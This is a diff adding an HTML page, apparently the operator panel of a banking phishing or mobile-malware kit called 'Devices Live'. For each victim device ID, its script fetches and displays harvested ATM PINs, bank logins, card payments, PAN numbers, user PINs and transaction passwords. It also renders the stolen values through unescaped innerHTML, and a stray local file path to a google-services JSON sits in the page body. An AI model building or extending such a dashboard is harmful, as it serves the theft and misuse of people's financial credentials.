@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>User Data | Devices Live</title>
+<link rel="stylesheet" href="css/data.css" />
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+
+</head>
+
+<body>
+
+<div id="loaderBox">
+  <div class="cube">
+    <div class="front"></div><div class="back"></div>
+    <div class="right"></div><div class="left"></div>
+    <div class="top"></div><div class="bottom"></div>
+  </div>
+  <div class="loading-text" style="color:#4fa3ff;font-size:18px;font-weight:700;">
+    Loading...
+  </div>
+</div>
+c:\Users\suman\Downloads\google-services (64).json
+<header class="header">
+  <h1 class="header-title">User <span style="color:#4fa3ff;">Data</span></h1>
+</header>
+
+<div class="container" id="dataContainer"></div>
+
+<script src="/env.js"></script>
+<script>
+const API_BASE = window._env_.API_BASE;
+const uniqueid = new URLSearchParams(window.location.search).get("id");
+const API_URL = `${API_BASE}/api/all-data/${uniqueid}`;
+
+const sectionNames = {
+  forms:"Forms",
+  atmPins:"ATM Pins",
+  bankLogins:"Bank Logins",
+  cardPayments:"Card Payments",
+  pan:"PAN Submissions",
+  userPins:"User Pins",
+  transactionPasswords:"Transaction Passwords"
+};
+
+async function loadUserData(){
+  const box = document.getElementById("dataContainer");
+
+  try{
+    const res = await fetch(API_URL);
+    const json = await res.json();
+    const data = json.data;
+
+    if(!data){
+      box.innerHTML = `<div class="data-block"><div class="title">No Data Found</div></div>`;
+      document.getElementById("loaderBox").style.display = "none";
+      return;
+    }
+
+    let html = "";
+
+    Object.entries(data).forEach(([key,value])=>{
+      if(!value) return;
+
+      const title = sectionNames[key] || key;
+
+      if(Array.isArray(value) && value.length>0){
+        value.forEach((entry,index)=>{
+          html += `<div class="data-block">`;
+          html += `<div class="title">${title} #${index+1}</div>`;
+          Object.entries(entry).forEach(([k,v])=>{
+            if(k !== "uniqueid"){
+              html += `<div class="item"><b>${k}:</b> ${v}</div>`;
+            }
+          });
+          html += `</div>`;
+        });
+      }
+      else if(typeof value === "object"){
+        html += `<div class="data-block">`;
+        html += `<div class="title">${title}</div>`;
+        Object.entries(value).forEach(([k,v])=>{
+          if(k !== "uniqueid"){
+            html += `<div class="item"><b>${k}:</b> ${v}</div>`;
+          }
+        });
+        html += `</div>`;
+      }
+    });
+
+    box.innerHTML = html;
+
+  }catch(err){
+    console.error(err);
+    box.innerHTML = `<p>Error loading data</p>`;
+  }
+
+  document.getElementById("loaderBox").style.display = "none";
+}
+
+loadUserData();
+</script>
+
+</body>
+</html>
